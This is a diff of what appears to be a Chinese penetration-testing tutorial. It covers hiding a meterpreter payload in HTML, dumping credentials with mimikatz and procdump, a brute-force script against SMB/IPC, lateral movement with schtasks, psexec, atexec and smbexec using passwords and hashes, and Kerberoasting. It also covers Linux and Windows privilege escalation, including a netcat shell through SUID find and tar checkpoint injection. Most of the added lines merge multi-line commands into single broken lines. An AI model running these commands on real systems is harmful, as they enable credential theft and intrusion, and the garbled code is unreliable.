 第一个工具 [EmbededInHTM](https://github.com/Arno0x/EmbedInHTML)，该工具的描述是“ 获取文件（任何类型的文件），加密它，并将其作为资源嵌入到 HTML 文件中，还包含模拟用户点击嵌入资源之后的自动下载进程。然后，当用户浏览 HTML 文件时，嵌入式文件即时解密，保存在临时文件夹中，然后将文件展示给用户。这一系列过程会让用户感觉该文件像是从远程站点下载来的。基于用户的浏览器和显示的文件类型，浏览器可以自动打开文件。”
 
 ```bash
-cd /op/EmbedInHTML
-python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
+cd /op/EmbedInHTMLpython embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/8a07ec8b11394556993f87988ae8da08.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -5269,8 +5240,7 @@ net group "Domain Controllers" /domain 查询域控制器
 不推荐nmap原因是nmap需要安装，nmap扫描可能会留下痕迹
 
 ```bash
-# 系统自带内部命令，不易被察觉
-for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL =" 
+# 系统自带内部命令，不易被察觉for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL =" 
 ```
 
 ****
@@ -5288,20 +5258,13 @@ nishang
 现在你可以直接打开mimikatz输入以下命令进行获取当前admin明文密码。
 
 ```bash
-privilege::debug
-# 获取明文密码、NTLM
-sekurlsa::logonpasswords full
-# 获取AES值
-sekurlsa::ekeys
+privilege::debug# 获取明文密码、NTLMsekurlsa::logonpasswords full# 获取AES值sekurlsa::ekeys
 ```
 
 如果遇到上述情况失败等，你可以采用procdump+mimikatz获取密码。procdump在微软官方下载可以将密码转化为hash值
 
 ```bash
-# 在敌方系统执行，将生成的lsass.dmp保存到自己电脑
- procdump -accepteula -ma lsass.exe lsass.dmp
-# 在自己电脑上执行mimikatz上执行，以获得明文密码：
- sekurlsa::minidump lsass.dmp
+# 在敌方系统执行，将生成的lsass.dmp保存到自己电脑 procdump -accepteula -ma lsass.exe lsass.dmp# 在自己电脑上执行mimikatz上执行，以获得明文密码： sekurlsa::minidump lsass.dmp
 ```
 
 **工具1: 从 Windows 凭据管理器和浏览器获取密码**
@@ -5341,48 +5304,60 @@ rundll32.exe user32.dll，LockWorkStation
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/58fa73fde87c466dba0ac4439c4c178d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ####  Mac
+
 有多个渗透攻击框架的 payload 支持 Mac，我最喜欢的是使用 Empire。Empire 可以生成多个 payload 来诱骗受害者执行我们的代理，其中包括 Ducky scripts、二进制可执行程序、Office 宏、Safari 启动程序、pkg 安装包等等。
+
 ####  Linux
+
 内核漏洞提权很难成功，因为内核提权对内核的版本，还有目标机器的环境要求很高(需要安装有gcc等编译环境来运行exp)
 
 查看基础信息
 
 ```bash
-uname -a                 #查看内核的具体信息
-cat /proc/version        #查看内核的具体信息
-cat /etc/centos-release  #查看centos发行版本
-cat /etc/redhat-release  #查看redhat发行版本
+uname -a                 #查看内核的具体信息cat /proc/version        #查看内核的具体信息cat /etc/centos-release  #查看centos发行版本cat /etc/redhat-release  #查看redhat发行版本
 ```
+
 查看该内核可能存在的漏洞
+
 ```bash
 ./Linux_Exploit_Suggester.pl 
 ```
 
 #####  脏牛提权
+
 **漏洞范围**:Linux内核 >= 2.6.22（2007年发行，到2016年10月18日才修复）
 
 **简要分析**：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。
 exp：https://github.com/gbonacini/CVE-2016-5195
+
 #####  SUID提权
+
 #####  SUDO提权
+
 #####  LINUX配置错误提权
+
 还有就是利用Linux的配置文件错误，导致 /etc/passwd 文件可写入提权：Linux提权之利用 /etc/passwd 文件
 
 对Linux配置进行检查的脚本有：https://www.securitysift.com/download/linuxprivchecker.py
 
 #####  定时任务提权
+
 系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。
 
 ```bash
 ls -l /etc/cron*
 ```
+
 使用该命令，列出的文件，查看 /etc/cron.daily 、/etc/cron.hourly、/etc/cron.monthly、/etc/cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。如果 允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了
+
 #####  密码复用提权
+
 我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码。那么就可以尝试一下 su root 来提权了。
 我们还可以查看主机上其他的第三方服务，利用第三方服务的漏洞可以拿到主机的 root 权限。比如如果主机的mysql或tomcat是用root权限启动的，而我们又通过漏洞拿到了mysql或tomcat的权限，就相当于获得了root的权限。
 
- 
+
 ##### 第三方服务提权
+
 # 横向渗透
 
 
@@ -5393,31 +5368,7 @@ ls -l /etc/cron*
 采用爆破，爆破有三个变量：密码（hash、明文）、ip、用户（信息搜集到的主机名）
 
 ```bash
-import os,time
-ips={
-   '192.168.3.21',
-   '192.168.3.25',
-   '192.168.3.29',
-}
-
-users={
-   'Administrator',
-   'boss',
-   'dbadmin',
-}
-passs={
-   'admin',
-   'admin!@#45',
-   'Admin12345'
-}
-
-for ip in ips:
-   for user in users:
-       for mima in passs:
-           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user
-           print('--->'+exec+'<---')
-           os.system(exec)
-           time.sleep(1)
+import os,timeips={   '192.168.3.21',   '192.168.3.25',   '192.168.3.29',}users={   'Administrator',   'boss',   'dbadmin',}passs={   'admin',   'admin!@#45',   'Admin12345'}for ip in ips:   for user in users:       for mima in passs:           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user           print('--->'+exec+'<---')           os.system(exec)           time.sleep(1)
 ```
 
 编写完脚本后打包成exe
@@ -5429,30 +5380,20 @@ for ip in ips:
 **at < Windows2012**
 
 ```bash
-net use \192.168.3.21\ipc$ "密码" /user:god.org\ad
-ministrator # 建立ipc连接：
-copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器
-at \192.168.3.21 15:47 c:\add.bat    #添加计划任务
+net use \192.168.3.21\ipc$ "密码" /user:god.org\administrator # 建立ipc连接：copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器at \192.168.3.21 15:47 c:\add.bat    #添加计划任务
 ```
 
 **schtasks >=Windows2012**
 
 ```bash
-net use \192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
-ministrator # 建立ipc连接：
-copy add.bat \192.168.3.32\c$ #复制文件到其C盘
-schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
-schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
-schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
+net use \192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator # 建立ipc连接：copy add.bat \192.168.3.32\c$ #复制文件到其C盘schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
 ```
 
 或者在工具不被杀毒软件干掉情况下，你可以直接用别人写好的工具，更简洁还支持hash值连接。
 atexec-impacket
 
 ```bash
-atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
-atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
-atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
+atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
 ```
 
 
@@ -5468,8 +5409,7 @@ psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd
 没有明文，那用第三方包smbexec
 
 ```bash
-smbexec god/administrator:Admin12345@192.168.3.21
-smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
+smbexec god/administrator:Admin12345@192.168.3.21smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
 ```
 
 ### SPN
@@ -5480,17 +5420,13 @@ smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
 **探针**
 
 ```bash
-# 类似于隐蔽的nmap扫描端口结果
-setspn -q */*
-setspn -q */* | findstr "MSSQL"
+# 类似于隐蔽的nmap扫描端口结果setspn -q */*setspn -q */* | findstr "MSSQL"
 ```
 
 **请求**
 
 ```c
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"
-mimikatz.exe "kerberos::ask /target:xxxx"
+Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"mimikatz.exe "kerberos::ask /target:xxxx"
 ```
 
 **导出**
@@ -5502,16 +5438,13 @@ mimikatz.exe "kerberos::list /export"
 **破解**
 
 ```bash
-python tgsrepcrack.py passwd.txt xxxx.kirbi
-python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
+python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
 ```
 
 **重写**
 
 ```bash
-python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
-python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512
-mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
+python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
 ```
 
 ## linux渗透
@@ -5615,18 +5548,19 @@ redis支持网络     可基于内存、可持久化的日志类型数据库.key
 **了解当前系统情况**
 
 ```bash
-whoami
-
-# 看系统、版本号、修复信息
-systeminfo
+whoami# 看系统、版本号、修复信息systeminfo
 ```
 
 
 ### window提权
 
-系统提权是希望从adminstator升级到system权限
+windows权限分为四种，由低到高的权限分别是user，administrator，system，trustedinstaller。提权分为纵向和横向。
 
-#### 提权准备
+#### 提权方法
+
+##### 系统内核溢出漏洞提权
+
+用户输入数据大小超过了缓存区大小，程序就会溢出
 
 信息搜集工具选其一，顺手即可
 **获取exp**
@@ -5727,9 +5661,7 @@ sc start "刚重置位置的服务名"
 检测引号未加上的服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功
 
 ```bash
-# 在cmd中输入以下命令以检测哪些服务未加上引号
-# 但这个代码返回的路径可能是包含空格的，也可能是没有。筛选掉没有空格的
-wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+# 在cmd中输入以下命令以检测哪些服务未加上引号# 但这个代码返回的路径可能是包含空格的，也可能是没有。筛选掉没有空格的wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 ```
 
 下图是我在cmd窗口执行的结果
@@ -5787,12 +5719,7 @@ RottenPotato(烂土豆)提权的原理可以简述如下：
 低权限提权高权限
 
 ```bash
-upload/root/potato.exe C: \Users \ Publiccd C: \ (Users \ \ Public
-use incognito
-list_tokens -u
-execute -cH -f ./potato.exe
-list_tokens -u
-impersonate token "NT AUTHORITY\ \SYSTEM"
+upload/root/potato.exe C: \Users \ Publiccd C: \ (Users \ \ Publicuse incognitolist_tokens -uexecute -cH -f ./potato.exelist_tokens -uimpersonate token "NT AUTHORITY\ \SYSTEM"
 ```
 
 ### LINUX提权
@@ -5818,10 +5745,7 @@ SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户
 **探测**
 
 ```bash
-FindSUID
-find/ -perm -u=s -type f 2>/dev/null
-FindGUID
-find/ -perm -g=s -type f 2>/dev/null
+FindSUIDfind/ -perm -u=s -type f 2>/dev/nullFindGUIDfind/ -perm -g=s -type f 2>/dev/null
 ```
 
 如果执行发现返回的目录包含以下关键词的说明存在suid配置错误漏洞
@@ -5831,9 +5755,7 @@ nmap vim less more nano cp mv find
 不同的模块有不同的执行命令，这里以find为例。更多模块利用方式参见 https://pentestlab.blog/2017/09/25/suid-executables/
 
 ```bash
-touch test 
-# 反弹find的高权限到
-find test exec netcat-lvp 5555-e /bin/sh \;
+touch test # 反弹find的高权限到find test exec netcat-lvp 5555-e /bin/sh \;
 ```
 
 
@@ -5842,14 +5764,7 @@ find test exec netcat-lvp 5555-e /bin/sh \;
 利用了压缩时会将checkpoint当做命令执行,定时任务有高权限
 
 ```bash
-# 定时任务将要执行的文件
-cd /home/undead/script
-# 创建压缩文件
-tar czf /tmp/backup.tar.gz *
-# 将最终命令写入到
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh
-echo  "" > "--checkpoint-action=exec=sh test.sh"
-echo  "" > "--checkpoint=1
+# 定时任务将要执行的文件cd /home/undead/script# 创建压缩文件tar czf /tmp/backup.tar.gz *# 将最终命令写入到echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.shecho  "" > "--checkpoint-action=exec=sh test.sh"echo  "" > "--checkpoint=1
 ```
 
 #### 定时任务执行权限分配过高
@@ -5878,9 +5793,7 @@ UDF (user defined function)，即用户自定义函数。
 手工创建plugin目录或利用NTFS流创建
 
 ```bash
-select 'x' into dumpfile '目录/lib/plugin : :INDEX_ALLOCATION';
-1.mysql<5.1（版本通过执行命令select version()看出）导出目录c :/ windows或system32
-2.mysql=>5.1导出  安装目录（通过@@basedir可以得出）/ lib/plugin/（默认没有/ lib/plugin/）
+select 'x' into dumpfile '目录/lib/plugin : :INDEX_ALLOCATION';1.mysql<5.1（版本通过执行命令select version()看出）导出目录c :/ windows或system322.mysql=>5.1导出  安装目录（通过@@basedir可以得出）/ lib/plugin/（默认没有/ lib/plugin/）
 ```
 
 ##### MOF
@@ -5978,19 +5891,25 @@ PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处"特性�
 修复方案:升级版本或打上补丁
 
 # 代码审计
+
 代码审计是指你获得源代码后对代码进行下载交互操作并做源代码层面的分析，因此你在做审计前通常需要提前配置好相关环境。
 代码审计的内容可能是审计框架也可能是审计混写也可能是程序员全程自己写的
+是
 
 ## phpweb
 
+中小型网站用得多
+
 ### 一键审计
+
 以下工具都会存在误报，需自行验证
 [海云安](https://www.secidea.com/)
+
 * 免费试用
-[seay](https://github.com/f1tz/cnseay)
+  [seay](https://github.com/f1tz/cnseay)
 * 免费
 * PHP代码审计
-系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞.文件下载链接
+  系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞.文件下载链接
 
 
 ### 数据库监控
@@ -6037,6 +5956,43 @@ unlink，delfile是php中对应删除的函数
 
 ## JAVAWEB
 
+主流
+
+### 开发基础
+
+JAVAEE主流框架就是常说的SSM,即Spring、Spring MVC、MyBatis。
+
+#### Spring
+
+##### 基础介绍
+
+**安装**
+[安装适应版本的dist包](https://repo.spring.io/ui/native/libs-release-local/org/springframework/spring/)
+解压后重点是lib文件夹，在里面jar包分为3类：
+
+ * 以RELEASE.jar结尾的是Spring框架class文件的压缩包。
+   * 以RELEASE-javadoc.jar结尾的是Spring框架API文档的压缩包。
+
+##### 核心知识点
+
+在spring框架中创建对象有特定的方法（而非普通java的new）
+bean
+spring aop
+
+spring数据库开发
+
+spring事务管理
+
+#### Spring MVC
+
+SpringMVC数据绑定、JSON数据交互和RESTful支持、拦截器。
+
+#### MyBatis
+
+MyBatis的核心配置、动态SQL、MyBatis的关联映射和MyBatis与Spring的整合
+
+### 开发基础
+
 与php不同是里面有自带一些安全防御的写法比如预编译，代码层级显示不一样；一个javaweb程序可能有多个不同的框架组合而成，具体哪些框架得看开发者要开发什么业务。
 以下展示了部分java框架
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718155255896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -6070,7 +6026,71 @@ springboot 框架对应的表示是SPEL
 **框架**
 框架版本、拦截器、执行流程是在试图挖0day漏洞需要认真考虑的
 
+
+
 ### 审计
+
+##### 常见审计知识点
+
+##### 寻找可控输入
+
+request.getParameter("前端id名")	从前端获取GET/POST参数
+
+等
+
+##### 过滤敏感字符方案
+
+在web.xml添加全局过滤器
+
+对于全局过滤器过滤替代特殊关键词
+
+#### SQL注入
+
+java中常见写法
+
+```bash
+# 绝对存在漏洞，这种写法少见了Select * from test where id = '"+可控词+"'# 利用预编译接口能防御绝大部分漏洞，但是配置不当仍旧会存在漏洞    String sql = "SELECT * from corps where id = ? "; # ?用于占位，通常是预编译的标志，在程序执行顺序是先经过预编译处理后在将干净参数做拼接PreparedStatement pstt = conn.prepareStatement(sql);pstt.setObject(1, id);## 预编译有误String query = "SELECT * FROM usersWHERE userid ='"+ userid + "'" + " AND password='" +password + "'";PreparedStatement stmt =connection.prepareStatement(query);ResultSet rs = stmt.executeQuery();# 存储过程。使用CallableStatement对存储过程接口的实现来执行数据库查询，SQL代码定义并存储在数据库本身中，然后从应用程序中调用，使用存储过程和预编译在防SQLi方面的效果是相同的。String custname =request.getParameter("customerName");try { CallableStatement cs = connection.prepareCall("{callsp_getAccountBalance(?)}"); cs.setString(1, custname); ResultSet results = cs.executeQuery();     } catch (SQLException se) {          }# 属于输入验证的范畴，大多使用正则表达式限制，或对于诸如排序顺序之类的简单操作，最好将用户提供的输入转换为布尔值，然后将该布尔值用于选择要附加到查询的安全值。public String someMethod(boolean sortOrder) {String SQLquery = "someSQL ... order by Salary " + (sortOrder ? "ASC" :"DESC");`
+```
+
+**框架可能存在漏洞与防御**
+
+Hibernate 框架中的 createQuery()函数等，如果使用不当，依旧可能造成 sql 注入。
+
+****
+
+Mybatis的#{}也是预处理方式处理SQL注入，虽然${}存在SQL注入的风险，但orderBy 、like、 in必须使用${}，因为#{}会多出单引号''导致SQL语句失效；
+
+但是可以选择在java层做映射或过滤用户输入进行防御。
+
+****
+
+**预编译绕过**
+
+参数orderExpression可以是一个selectExpression也可以是一个函数，比如使用一个case when语句，你可以把case when表达式理解成一个类似拼接的语句。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)
+
+
+
+ **order by 绕过预编译**
+
+类似下面sql语句 order by 后面是不能用预编译处理的只能通过拼接处理，只能手动进行过滤，详见案例。
+
+```javascript
+String sql = “Select * from news where title =?”+ “order by‘” + time + “’asc”
+```
+
+**%和_绕过预编译**
+
+ 预编译是不能处理%，需要手动过滤，否则会造成慢查询和DOS。
+
+ **SQLi检测绕过**
+
+  若SQL在处理过程中经过黑/白名单（正则）或Filter检测，通常检测代码存在缺陷则可进行检测绕过。
+
+##### 防御
+
+1) 
 
 #### 手动
 
@@ -6101,10 +6121,13 @@ Mybaits配置文件:mybatis-config . xml
 
 #### 工具
 
-**一键代码审计**
-Fortify
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718150723281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-**IDE**
+
+一键代码审计：Fortify、海云安
+
+反编译（将无法直接阅读的.class字节码文件）：
+
+IDE：Jetbrains IDEA
+
 **全局搜索**
 ctrl+shift+F 全局搜索，通常搜索出关键词有可能匹配过多，可以导入新窗口看得更清晰
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718153132565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
